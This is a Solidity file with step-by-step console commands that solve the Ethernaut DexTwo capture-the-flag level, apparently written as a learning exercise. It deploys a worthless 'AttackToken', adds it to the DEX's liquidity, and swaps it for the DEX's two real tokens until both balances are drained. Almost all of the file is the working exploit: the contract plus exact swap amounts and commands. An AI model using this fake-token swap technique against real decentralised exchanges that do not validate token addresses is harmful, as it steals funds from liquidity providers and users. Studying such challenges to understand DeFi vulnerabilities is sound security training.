/*
Tools needed for this level:
-Console
-Remix IDE

1.- Deploy this contract (DexTwoAttackToken) with Remix using Injected Web3 environment.

2.- Approve the 400 tokens for Ethernaut's DexTwo contract address using Remix to be able to swap them.

3.- Copy the address of deployed contract and declare it in the console:
attack = "replace_with_deployed_contract_address"

4.- Declare the tokens addresses via console (one by one):
tk1 = await contract.token1()
tk2 = await contract.token2()

5.- Add 100 attack tokens to Dex balance.
await contract.add_liquidity(attack, 100)

6.- Swap 100 attack tokens for 100 tk1 tokens:
await contract.swap(attack, tk1, 100)
    
7.- Swap 200 attack tokens for 100 tk2 tokens (ratio changes given the actual balance of DEX):
await contract.swap(attack, tk2, 200)

8.- Check if token balances on Dex are drained:
String(await contract.balanceOf(tk1, instance));
String(await contract.balanceOf(tk2, instance));
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol';

contract DexTwoAttackToken is ERC20 {
	uint256 supply = 400;

	constructor() ERC20('AttackToken', 'ATK') {
		ERC20._mint(msg.sender, supply);
	}
}
